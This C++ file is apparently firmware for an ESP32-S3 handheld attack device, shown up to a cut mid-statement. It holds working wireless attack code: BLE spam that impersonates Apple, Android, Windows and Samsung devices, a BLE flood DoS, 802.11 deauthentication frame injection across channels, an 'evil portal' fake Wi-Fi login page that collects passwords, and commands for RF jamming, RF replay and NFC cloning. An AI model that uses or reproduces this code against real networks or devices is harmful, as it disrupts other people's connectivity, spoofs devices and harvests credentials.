// esp32s3.cpp - Bruce Firmware for ESP32-S3 Main Controller
// Kết nối với ESP32-C5 qua UART để điều khiển RF, NFC, IR
// Tích hợp đầy đủ BLE Attacks

#include "core/main_menu.h"
#include <globals.h>

#include "core/powerSave.h"
#include "core/serial_commands/cli.h"
#include "core/utils.h"
#include "current_year.h"
#include "esp32-hal-psram.h"
#include "esp_task_wdt.h"
#include "esp_wifi.h"
#include <functional>
#include <string>
#include <vector>

// ===================== BLE Libraries =====================
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <BLEBeacon.h>

// ===================== Định nghĩa chân cho ESP32-S3 theo sơ đồ =====================
#define TFT_MOSI    11
#define TFT_SCLK    12
#define TFT_CS      10
#define TFT_DC      14
#define TFT_RST     15
#define TFT_BL      21
#define SD_CS       9
#define SD_MISO     13
#define BTN_UP      1
#define BTN_DOWN    2
#define BTN_LEFT    3
#define BTN_RIGHT   38
#define BTN_CENTER  39
#define UART_C5_TX  17
#define UART_C5_RX  18

// ===================== BLE Constants =====================
const uint8_t appleManufacturerData[] = {0x4C, 0x00, 0x0F, 0x0A, 0x00};
const uint8_t appleJuiceData[] = {0x4C, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

const char* iosFakeNames[] = {"AirPods Pro", "iPhone 15 Pro", "Apple Watch Ultra", "MacBook Pro M3", "HomePod Mini", "AirTag", "iPad Pro", "Apple TV", "Magic Mouse", "Magic Keyboard"};
const char* androidFakeNames[] = {"Galaxy S24 Ultra", "Pixel 8 Pro", "Xiaomi 14 Pro", "OnePlus 12", "Nothing Phone 2", "Galaxy Buds2 Pro", "Galaxy Watch 6", "Xiaomi Band 8", "Oppo Find X7"};
const char* windowsFakeNames[] = {"Surface Pro", "Xbox Series X", "Surface Laptop", "HoloLens", "Surface Headphones", "Xbox Controller"};
const char* samsungFakeNames[] = {"Galaxy S24", "Galaxy Buds FE", "Galaxy Watch 6", "SmartTag2", "Galaxy Book4", "Galaxy Tab S9"};

// ===================== Khởi tạo đối tượng =====================
io_expander ioExpander;
BruceConfig bruceConfig;
BruceConfigPins bruceConfigPins;
SerialCli serialCli;
USBSerial USBserial;
SerialDevice *serialDevice = &USBserial;
StartupApp startupApp;
String startupAppJSInterpreterFile = "";
MainMenu mainMenu;
SPIClass sdcardSPI(FSPI);
HardwareSerial SerialC5(1);

// Navigation Variables
volatile bool NextPress = false, PrevPress = false, UpPress = false, DownPress = false;
volatile bool SelPress = false, EscPress = false, AnyKeyPress = false;
volatile bool NextPagePress = false, PrevPagePress = false, LongPress = false, SerialCmdPress = false;
volatile int forceMenuOption = -1;
volatile uint8_t menuOptionType = 0;
String menuOptionLabel = "";
#ifdef HAS_ENCODER_LED
volatile int EncoderLedChange = 0;
#endif

TouchPoint touchPoint;
keyStroke KeyStroke;
TaskHandle_t xHandle;
TaskHandle_t bleSpamHandle = nullptr;

// Public Globals
unsigned long previousMillis = millis();
int prog_handler = 0;
String cachedPassword = "";
int8_t interpreter_state = -1;
bool sdcardMounted = false, gpsConnected = false, c5Connected = false;
bool wifiConnected = false, isWebUIActive = false, BLEConnected = false;
bool returnToMenu = false, isSleeping = false, isScreenOff = false, dimmer = false;
String wifiIP = "";
char timeStr[16];
time_t localTime;
struct tm *timeInfo;

#if defined(HAS_RTC)
#if defined(HAS_RTC_PCF85063A)
pcf85063_RTC _rtc;
#else
cplus_RTC _rtc;
#endif
RTC_TimeTypeDef _time;
RTC_DateTypeDef _date;
bool clock_set = true;
#else
ESP32Time rtc;
bool clock_set = false;
#endif

std::vector<Option> options;

#if defined(HAS_SCREEN)
tft_logger tft = tft_logger();
tft_sprite sprite = tft_sprite(&tft);
tft_sprite draw = tft_sprite(&tft);
volatile int tftWidth = TFT_HEIGHT;
#ifdef HAS_TOUCH
volatile int tftHeight = TFT_WIDTH - 20;
#else
volatile int tftHeight = TFT_WIDTH;
#endif
#else
tft_logger tft;
SerialDisplayClass &sprite = tft;
SerialDisplayClass &draw = tft;
volatile int tftWidth = VECTOR_DISPLAY_DEFAULT_HEIGHT;
volatile int tftHeight = VECTOR_DISPLAY_DEFAULT_WIDTH;
#endif

#include "core/display.h"
#include "core/led_control.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/serialcmds.h"
#include "core/settings.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "modules/bjs_interpreter/interpreter.h"
#include "modules/others/audio.h"
#include "modules/rf/rf_utils.h"
#include <Wire.h>

// ===================== BLE Callback =====================
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        String deviceInfo = "BLE:" + String(advertisedDevice.getAddress().toString().c_str());
        if (advertisedDevice.haveName()) deviceInfo += "|" + String(advertisedDevice.getName().c_str());
        if (advertisedDevice.haveRSSI()) deviceInfo += "|RSSI:" + String(advertisedDevice.getRSSI());
        Serial.println(deviceInfo);
        tft.fillRect(0, 100, tftWidth, 20, bruceConfig.bgColor);
        tft.setCursor(10, 100);
        tft.println(advertisedDevice.getName().c_str());
    }
};

// ===================== Giao tiếp C5 =====================
void initC5Communication() {
    SerialC5.begin(115200, SERIAL_8N1, UART_C5_RX, UART_C5_TX);
    delay(100);
    SerialC5.println("PING");
    unsigned long startTime = millis();
    while (millis() - startTime < 2000) {
        if (SerialC5.available()) {
            String response = SerialC5.readStringUntil('\n');
            response.trim();
            if (response == "PONG") {
                c5Connected = true;
                Serial.println("[C5] Connected!");
                break;
            }
        }
        delay(10);
    }
    if (!c5Connected) Serial.println("[C5] Not responding!");
}

void sendToC5(String cmd) {
    if (!c5Connected) { Serial.println("[C5] Not connected!"); return; }
    SerialC5.println(cmd);
    Serial.println("[C5] Sent: " + cmd);
}

String readFromC5(int timeout = 3000) {
    if (!c5Connected) return "";
    String response = "";
    unsigned long startTime = millis();
    while (millis() - startTime < timeout) {
        if (SerialC5.available()) {
            response = SerialC5.readStringUntil('\n');
            response.trim();
            return response;
        }
        delay(10);
    }
    return "";
}

// ===================== Xử lý phím =====================
void initJoystick() {
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_CENTER, INPUT_PULLUP);
}

void readJoystick() {
    if (digitalRead(BTN_UP) == LOW) { UpPress = true; AnyKeyPress = true; }
    if (digitalRead(BTN_DOWN) == LOW) { DownPress = true; AnyKeyPress = true; }
    if (digitalRead(BTN_LEFT) == LOW) { PrevPress = true; AnyKeyPress = true; }
    if (digitalRead(BTN_RIGHT) == LOW) { NextPress = true; AnyKeyPress = true; }
    if (digitalRead(BTN_CENTER) == LOW) { SelPress = true; AnyKeyPress = true; }
}

void InputHandler() { readJoystick(); }
void initSPI() { sdcardSPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI, SD_CS); }

// ===================== BLE Functions =====================
void bleScan() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("BLE SCANNING...", tftWidth / 2, 50, 2);
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    unsigned long start = millis();
    int y = 80;
    while (millis() - start < 30000) {
        BLEScanResults foundDevices = pBLEScan->start(2, false);
        char buf[64];
        sprintf(buf, "Found %d devices", foundDevices.getCount());
        tft.fillRect(0, y, tftWidth, 20, bruceConfig.bgColor);
        tft.drawCentreString(buf, tftWidth / 2, y, 1);
        if (check(EscPress)) break;
        delay(100);
        y += 15;
        if (y > tftHeight - 20) y = 80;
    }
    pBLEScan->clearResults();
    tft.drawCentreString("SCAN DONE", tftWidth / 2, tftHeight - 30, 2);
    delay(1500);
}

volatile bool bleSpamActive = false;

void bleSpamTask(void* parameter) {
    BLEDevice::init("SpamDevice");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData;
    int spamType = *(int*)parameter;
    int index = 0;
    
    while (bleSpamActive) {
        advertisementData = BLEAdvertisementData();
        switch(spamType) {
            case 0:
                advertisementData.setManufacturerData(std::string((char*)appleManufacturerData, sizeof(appleManufacturerData)));
                advertisementData.setName(iosFakeNames[index % 10]);
                advertisementData.setCompleteName(iosFakeNames[index % 10]);
                advertisementData.setFlags(0x06);
                break;
            case 1:
                advertisementData.setName(androidFakeNames[index % 9]);
                advertisementData.setCompleteName(androidFakeNames[index % 9]);
                advertisementData.setFlags(0x06);
                break;
            case 2:
                advertisementData.setName(windowsFakeNames[index % 6]);
                advertisementData.setCompleteName(windowsFakeNames[index % 6]);
                break;
            case 3:
                advertisementData.setName(samsungFakeNames[index % 6]);
                advertisementData.setCompleteName(samsungFakeNames[index % 6]);
                break;
            case 4:
                advertisementData.setManufacturerData(std::string((char*)appleJuiceData, sizeof(appleJuiceData)));
                advertisementData.setName("Apple Device");
                break;
            case 5: {
                uint8_t randomData[31];
                for (int i = 0; i < 31; i++) randomData[i] = random(0xFF);
                advertisementData.setManufacturerData(std::string((char*)randomData, 31));
                char randomName[20];
                sprintf(randomName, "Device_%04d", random(10000));
                advertisementData.setName(randomName);
                break;
            }
        }
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(80);
        pAdvertising->stop();
        delay(20);
        index++;
        if (index >= 100) index = 0;
        if (!bleSpamActive) break;
    }
    pAdvertising->stop();
    vTaskDelete(NULL);
}

void startBleSpam(int type) {
    if (bleSpamActive) { bleSpamActive = false; delay(500); }
    bleSpamActive = true;
    xTaskCreate(bleSpamTask, "BLESpam", 4096, &type, 1, &bleSpamHandle);
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("BLE SPAM ACTIVE", tftWidth / 2, tftHeight / 2 - 20, 2);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
    while (!check(SelPress) && bleSpamActive) delay(100);
    bleSpamActive = false;
    delay(500);
    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
    delay(1000);
}

void bleIOSSpam() { startBleSpam(0); }
void bleAndroidSpam() { startBleSpam(1); }
void bleWindowsSpam() { startBleSpam(2); }
void bleSamsungSpam() { startBleSpam(3); }
void bleAppleJuice() { startBleSpam(4); }
void bleRandomSpam() { startBleSpam(5); }

void bleFlood() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("BLE FLOOD DoS", tftWidth / 2, tftHeight / 2 - 20, 2);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
    BLEDevice::init("FLOOD");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    while (!check(SelPress)) {
        uint8_t randomData[31];
        for (int i = 0; i < 31; i++) randomData[i] = random(0xFF);
        BLEAdvertisementData advertisementData;
        advertisementData.setManufacturerData(std::string((char*)randomData, 31));
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(1);
        pAdvertising->stop();
        delay(1);
    }
    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
    delay(1000);
}

void bleBeaconSpam() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("BEACON SPAM", tftWidth / 2, tftHeight / 2 - 20, 2);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
    BLEDevice::init("BeaconSpam");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEBeacon oBeacon = BLEBeacon();
    while (!check(SelPress)) {
        oBeacon.setManufacturerId(0x004C);
        oBeacon.setMajor(random(65535));
        oBeacon.setMinor(random(65535));
        oBeacon.setSignalPower(random(256));
        BLEAdvertisementData advertisementData = BLEAdvertisementData();
        advertisementData.setFlags(0x04);
        advertisementData.setManufacturerData(oBeacon.getData());
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(50);
        pAdvertising->stop();
        delay(10);
    }
    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
    delay(1000);
}

// ===================== RF Functions (via C5) =====================
void rfScan() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("RF Scanning...", tftWidth / 2, tftHeight / 3, 2);
    sendToC5("RF_SCAN");
    unsigned long start = millis();
    while (millis() - start < 10000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            resp.trim();
            if (resp == "RF_SCAN_DONE") break;
            tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 1);
        }
        delay(50);
        if (check(EscPress)) break;
    }
    delay(1000);
}

void rfJamFull() {
    sendToC5("RF_JAM_FULL");
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("RF Jammer ON", tftWidth / 2, tftHeight / 2, 2);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 30, 1);
    while (!check(SelPress)) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            if (resp == "RF_JAM_OFF") break;
        }
        delay(50);
    }
    sendToC5("RF_JAM_FULL");
    delay(500);
}

void rfReplay() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Replaying RF...", tftWidth / 2, tftHeight / 3, 2);
    sendToC5("RF_REPLAY");
    unsigned long start = millis();
    while (millis() - start < 5000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 1);
        }
        delay(50);
    }
    delay(1000);
}

void rfCapture() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("RF Capture Mode", tftWidth / 2, 30, 2);
    tft.drawCentreString("Press CENTER to start", tftWidth / 2, tftHeight / 2, 1);
    waitForPress(SelPress, 0);
    sendToC5("RF_CAPTURE");
    tft.fillRect(0, tftHeight / 2 - 20, tftWidth, 80, bruceConfig.bgColor);
    tft.drawCentreString("CAPTURING...", tftWidth / 2, tftHeight / 2, 2);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 30, 1);
    while (!check(SelPress)) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            if (resp == "CAPTURE_STOPPED") break;
        }
        delay(50);
    }
    sendToC5("STOP");
    delay(1000);
}

// ===================== NFC Functions =====================
void nfcRead() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Place NFC tag", tftWidth / 2, tftHeight / 3, 2);
    sendToC5("NFC_READ");
    unsigned long start = millis();
    while (millis() - start < 10000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            if (resp.startsWith("NFC_UID:")) {
                tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 2);
                break;
            } else if (resp == "NFC_NO_TAG") {
                tft.drawCentreString("No tag found", tftWidth / 2, tftHeight / 2, 2);
            }
        }
        delay(50);
        if (check(EscPress)) break;
    }
    delay(2000);
}

void nfcClone() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Cloning NFC...", tftWidth / 2, tftHeight / 3, 2);
    sendToC5("NFC_CLONE");
    unsigned long start = millis();
    while (millis() - start < 10000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 1);
        }
        delay(50);
    }
    delay(2000);
}

void nfcEmulate() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("NFC Emulation", tftWidth / 2, 30, 2);
    tft.drawCentreString("Place phone near device", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 30, 1);
    sendToC5("NFC_EMULATE");
    while (!check(SelPress)) delay(100);
    sendToC5("NFC_EMULATE_STOP");
    delay(1000);
}

// ===================== IR Functions =====================
void tvBgone() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("TV-B-Gone", tftWidth / 2, tftHeight / 3, 2);
    tft.drawCentreString("Sending IR codes...", tftWidth / 2, tftHeight / 2, 1);
    sendToC5("IR_TVBGONE");
    unsigned long start = millis();
    while (millis() - start < 15000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            if (resp == "IR_TVBGONE_DONE") break;
        }
        delay(50);
        if (check(EscPress)) break;
    }
    delay(1000);
}

void irReceive() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Point remote to IR receiver", tftWidth / 2, tftHeight / 3, 2);
    tft.drawCentreString("Waiting...", tftWidth / 2, tftHeight / 2, 1);
    sendToC5("IR_RECV");
    unsigned long start = millis();
    while (millis() - start < 10000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            if (resp.startsWith("IR_CODE:")) {
                tft.fillRect(0, tftHeight / 2 - 20, tftWidth, 40, bruceConfig.bgColor);
                tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 1);
                break;
            } else if (resp == "IR_TIMEOUT") {
                tft.drawCentreString("Timeout", tftWidth / 2, tftHeight / 2, 1);
            }
        }
        delay(50);
        if (check(EscPress)) break;
    }
    delay(2000);
}

void irSendNEC() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Sending NEC IR...", tftWidth / 2, tftHeight / 2, 2);
    sendToC5("IR_SEND_NEC");
    delay(500);
    String resp = readFromC5(2000);
    tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2 + 30, 1);
    delay(1000);
}

// ===================== WiFi Functions =====================
void wifiDeauth() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("DEAUTH ATTACK", tftWidth / 2, tftHeight / 3, 2);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    typedef struct {
        uint16_t frame_ctrl;
        uint16_t duration;
        uint8_t dest[6];
        uint8_t src[6];
        uint8_t bssid[6];
        uint16_t seq_ctrl;
        uint8_t reason_code[2];
    } __attribute__((packed)) deauth_frame_t;
    
    unsigned long start = millis();
    while (millis() - start < 15000) {
        for (int ch = 1; ch <= 11; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            deauth_frame_t deauth;
            memset(&deauth, 0, sizeof(deauth));
            deauth.frame_ctrl = 0xC0;
            memcpy(deauth.dest, broadcast_mac, 6);
            memcpy(deauth.src, mac, 6);
            memcpy(deauth.bssid, broadcast_mac, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
        }
        int elapsed = (millis() - start) / 1000;
        tft.fillRect(0, tftHeight / 2, tftWidth, 20, bruceConfig.bgColor);
        tft.drawCentreString("Running: " + String(elapsed) + "s", tftWidth / 2, tftHeight / 2, 1);
        if (check(SelPress)) break;
        delay(10);
    }
    esp_wifi_set_promiscuous(false);
    tft.drawCentreString("DONE!", tftWidth / 2, tftHeight / 2 + 30, 2);
    delay(1000);
}

void evilPortal() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("EVIL PORTAL", tftWidth / 2, tftHeight / 3, 2);
    tft.drawCentreString("AP: Free_WiFi", tftWidth / 2, tftHeight / 2, 1);
    WiFi.softAP("Free_WiFi");
    DNSServer dnsServer;
    WebServer server(80);
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", []() { server.send(200, "text/html", "<h1>Login</h1><form><input type='password' name='pass'><input type='submit'></form>"); });
    server.begin();
    unsigned long start = millis();
    while (millis() - start < 30000) {
        dnsServer.processNextRequest();
        server.handleClient();
        if (check(SelPress)) break;
        delay(10);
    }
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
}

void wifiBeaconSpam() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("BEACON SPAM", tftWidth / 2, tftHeight / 3, 2);
    tft.drawCentreString("Spamming SSIDs...", tftWidth / 2, tftHeight / 2, 1);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    unsigned long start = millis();
    while (millis() - start < 30000) {
        for (int ch = 1; ch <= 11; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            for (int i = 0; i < 7; i++) delay(1);
        }
        if (check(SelPress)) break;
    }
    esp_wifi_set_promiscuous(false);
    tft.drawCentreString("DONE!", tftWidth / 2, tftHeight / 2 + 30, 2);
    delay(1000);
}

// ===================== Menu Functions =====================
void sdManager() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setCursor(10, 10);
    tft.println("SD Card Files:");
    File root = SD.open("/");
    File file = root.openNextFile();
    int y = 40;
    while(file && y < tftHeight - 20){
        tft.setCursor(10, y);
        tft.println(file.name());
        file = root.openNextFile();
        y += 20;
        if (y > tftHeight - 40) {
            delay(2000);
            tft.fillRect(0, 40, tftWidth, tftHeight - 60, bruceConfig.bgColor);
            y = 40;
        }
    }
    delay(3000);
}

void runScriptMenu() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Scripts", tftWidth / 2, 20, 2);
    delay(2000);
}

void configMenu() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Settings", tftWidth / 2, 20, 2);
    tft.drawCentreString("Coming Soon", tftWidth / 2, tftHeight / 2, 2);
    delay(1500);
}

void startWebUI() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawCentreString("Starting WebUI...", tftWidth / 2, tftHeight / 3, 2);
    WiFi.softAP("Bruce_AP", "12345678");
    tft.drawCentreString("AP: Bruce_AP", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("IP: 192.168.4.1", tftWidth / 2, tftHeight / 2 + 20, 1);
    WebServer webServer(80);
    webServer.on("/", []() {
        String html = "<html><head><title>Bruce</title></head><body>";
        html += "<h1>Bruce Firmware</h1>";
        html += "<a href='/scan'>WiFi Scan</a><br>";
        html += "<a href='/deauth'>Deauth Attack</a><br>";
        html += "<a href='/beacon'>Beacon Spam</a><br>";
        html += "</body></html>";
        webServer.send(200, "text/html", html);
    });
    webServer.begin();
    unsigned long start = millis();
    while (millis() - start < 60000) {
        webServer.handleClient();
        if (check(SelPress)) break;
        delay(10);
    }
    webServer.stop();
    WiFi.softAPdisconnect(true);
}

// ===================== Core Functions =====================
void begin_storage() {
    if (!LittleFS.begin(true)) { LittleFS.format(); LittleFS.begin(); }
    bool checkFS = setupSdCard();
    bruceConfig.fromFile(checkFS);
    bruceConfigPins.fromFile(checkFS);
}

void _setup_gpio() __attribute__((weak));
void _setup_gpio() { initSPI(); initJoystick(); initC5Communication(); }

void _post_setup_gpio() __attribute__((weak));
void _post_setup_gpio() {}

void setup_gpio() {
    _setup_gpio();
    ioExpander.init(IO_EXPANDER_ADDRESS, &Wire);
#if TFT_MOSI > 0
    if (bruceConfigPins.CC1101_bus.mosi == (gpio_num_t)TFT_MOSI)
        initCC1101once(&tft.getSPIinstance());
    else
#endif
        if (bruceConfigPins.CC1101_bus.mosi == bruceConfigPins.SDCARD_bus.mosi)
        initCC1101once(&sdcardSPI);
    else initCC1101once(NULL);
}

void begin_tft() {
    tft.getSPIinstance().begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
    tft.setRotation(bruceConfigPins.rotation);
    tft.invertDisplay(bruceConfig.colorInverted);
    tft.setRotation(bruceConfigPins.rotation);
    tftWidth = tft.width();
#ifdef HAS_TOUCH
    tftHeight = tft.height() - 20;
#else
    tftHeight = tft.height();
#endif
    resetTftDisplay();
    setBrightness(bruceConfig.bright, false);
}

void boot_screen() {
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.drawPixel(0, 0, bruceConfig.bgColor);
    tft.drawCentreString("Bruce", tftWidth / 2, 10, 1);
    tft.setTextSize(FP);
    tft.drawCentreString(BRUCE_VERSION, tftWidth / 2, 25, 1);
    tft.setTextSize(FM);
    tft.drawCentreString("PREDATORY FIRMWARE", tftWidth / 2, tftHeight + 2, 1);
}

void boot_screen_anim() {
    boot_screen();
    int i = millis();
    int boot_img = 0;
    bool drawn = false;
    if (sdcardMounted) {
        if (SD.exists("/boot.jpg")) boot_img = 1;
        else if (SD.exists("/boot.gif")) boot_img = 3;
    }
    if (boot_img == 0 && LittleFS.exists("/boot.jpg")) boot_img = 2;
    else if (boot_img == 0 && LittleFS.exists("/boot.gif")) boot_img = 4;
    if (bruceConfig.theme.boot_img) boot_img = 5;
    tft.drawPixel(0, 0, 0);
    while (millis() < i + 7000) {
        if ((millis() - i > 2000) && !drawn) {
            tft.fillRect(0, 45, tftWidth, tftHeight - 45, bruceConfig.bgColor);
            if (boot_img > 0 && !drawn) {
                tft.fillScreen(bruceConfig.bgColor);
                if (boot_img == 5) {
                    drawImg(*bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_img), 0, 0, true, 3600);
                } else if (boot_img == 1) {
                    drawImg(SD, "/boot.jpg", 0, 0, true);
                } else if (boot_img == 2) {
                    drawImg(LittleFS, "/boot.jpg", 0, 0, true);
                } else if (boot_img == 3) {
                    drawImg(SD, "/boot.gif", 0, 0, true, 3600);
                } else if (boot_img == 4) {
                    drawImg(LittleFS, "/boot.gif", 0, 0, true, 3600);
                }
                tft.drawPixel(0, 0, 0);
            }
            drawn = true;
        }
        if (check(AnyKeyPress)) {
            tft.fillScreen(bruceConfig.bgColor);
            delay(10);
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    tft.fillScreen(bruceConfig.bgColor);
}

void init_clock() {
#if defined(HAS_RTC)
    _rtc.begin();
#if defined(HAS_RTC_BM8563)
    _rtc.GetBm8563Time();
#endif
#if defined(HAS_RTC_PCF85063A)
    _rtc.GetPcf85063Time();
#endif
    _rtc.GetTime(&_time);
    _rtc.GetDate(&_date);
    struct tm timeinfo = {};
    timeinfo.tm_sec = _time.Seconds;
    timeinfo.tm_min = _time.Minutes;
    timeinfo.tm_hour = _time.Hours;
    timeinfo.tm_mday = _date.Date;
    timeinfo.tm_mon = _date.Month > 0 ? _date.Month - 1 : 0;
    timeinfo.tm_year = _date.Year >= 1900 ? _date.Year - 1900 : 0;
    time_t epoch = mktime(&timeinfo);
    struct timeval tv = {.tv_sec = epoch};
    settimeofday(&tv, nullptr);
#else
    struct tm timeinfo = {};
    timeinfo.tm_year = CURRENT_YEAR - 1900;
    timeinfo.tm_mon = 0x05;
    timeinfo.tm_mday = 0x14;
    time_t epoch = mktime(&timeinfo);
    rtc.setTime(epoch);
    clock_set = true;
    struct timeval tv = {.tv_sec = epoch};
    settimeofday(&tv, nullptr);
#endif
}

void init_led() {
#ifdef HAS_RGB_LED
    beginLed();
#endif
    pinMode(TFT_BL, OUTPUT);
    digitalWrite(TFT_BL, HIGH);
}

void startup_sound() {
    if (bruceConfig.soundEnabled == 0) return;
#if !defined(LITE_VERSION)
#if defined(BUZZ_PIN)
    _tone(5000, 50);
    delay(200);
    _tone(5000, 50);
#elif defined(HAS_NS4168_SPKR)
    if (bruceConfig.theme.boot_sound) {
        playAudioFile(bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_sound));
    } else if (SD.exists("/boot.wav")) {
        playAudioFile(&SD, "/boot.wav");
    } else if (LittleFS.exists("/boot.wav")) {
        playAudioFile(&LittleFS, "/boot.wav");
    }
#endif
#endif
}

void __attribute__((weak)) taskInputHandler(void *parameter) {
    auto timer = millis();
    while (true) {
        checkPowerSaveTime();
        if (!AnyKeyPress || millis() - timer > 75) {
            NextPress = false; PrevPress = false; UpPress = false; DownPress = false;
            SelPress = false; EscPress = false; AnyKeyPress = false; SerialCmdPress = false;
            NextPagePress = false; PrevPagePress = false;
            touchPoint.pressed = false;
            touchPoint.Clear();
#ifndef USE_TFT_eSPI_TOUCH
            InputHandler();
#endif
            timer = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void setup() {
    Serial.setRxBufferSize(SAFE_STACK_BUFFER_SIZE / 4);
    Serial.begin(115200);
    log_d("Total heap: %d", ESP.getHeapSize());
    log_d("Free heap: %d", ESP.getFreeHeap());
    if (psramInit()) log_d("PSRAM Started");
    if (psramFound()) log_d("PSRAM Found");
    else log_d("PSRAM Not Found");
    log_d("Total PSRAM: %d", ESP.getPsramSize());
    log_d("Free PSRAM: %d", ESP.getFreePsram());

    prog_handler = 0;
    sdcardMounted = false;
    wifiConnected = false;
    BLEConnected = false;
    bruceConfig.bright = 100;
    bruceConfigPins.rotation = ROTATION;
    setup_gpio();
    
#if defined(HAS_SCREEN)
    tft.init();
    tft.setRotation(bruceConfigPins.rotation);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_PURPLE, TFT_BLACK);
    tft.drawCentreString("Booting", tft.width() / 2, tft.height() / 2, 1);
#else
    tft.begin();
#endif
    begin_storage();
    begin_tft();
    init_clock();
    init_led();

    options.reserve(20);
    const wifi_country_t country = {.cc = "US", .schan = 1, .nchan = 14,
